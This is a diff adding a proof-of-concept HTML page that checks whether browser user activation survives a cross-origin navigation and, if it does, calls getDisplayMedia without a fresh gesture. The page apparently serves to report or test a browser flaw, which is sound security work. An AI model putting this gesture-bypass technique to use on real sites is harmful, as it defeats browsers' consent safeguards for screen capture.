@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>PoC - Target Page (Vulnerable Origin)</title>
+</head>
+
+<body style="background: #e3f2fd; font-family: sans-serif; text-align: center; padding: 50px;">
+    <h1>Target Page (Target Origin)</h1>
+    <p>User Activation Status: <b id="act-status">Checking...</b></p>
+
+    <script>
+        /**
+         * PoC: Checks if User Activation state (Transient Activation) 
+         * persists after a cross-origin navigation.
+         */
+        setInterval(() => {
+            const isActive = navigator.userActivation.isActive;
+            const statusElement = document.getElementById('act-status');
+
+            // Update UI based on activation state
+            statusElement.innerText = isActive ? "VULNERABLE (LEAKED!)" : "INACTIVE (NORMAL)";
+            statusElement.style.color = isActive ? "red" : "green";
+
+            if (isActive) {
+                console.log("[!] Leak detected. Triggering privileged API...");
+
+                // Triggering getDisplayMedia without a fresh user gesture on this domain
+                navigator.mediaDevices.getDisplayMedia({ video: true })
+                    .then(() => {
+                        alert("EXPLOIT SUCCESSFUL:\n\nUser Activation Leak Detected!\nMedia picker opened without user interaction on this domain.");
+                    })
+                    .catch(e => {
+                        // Console log for debugging if the browser blocks the call
+                        console.log("Failed to trigger API: " + e.message);
+                    });
+            }
+        }, 100);
+    </script>
+</body>
+
+</html>
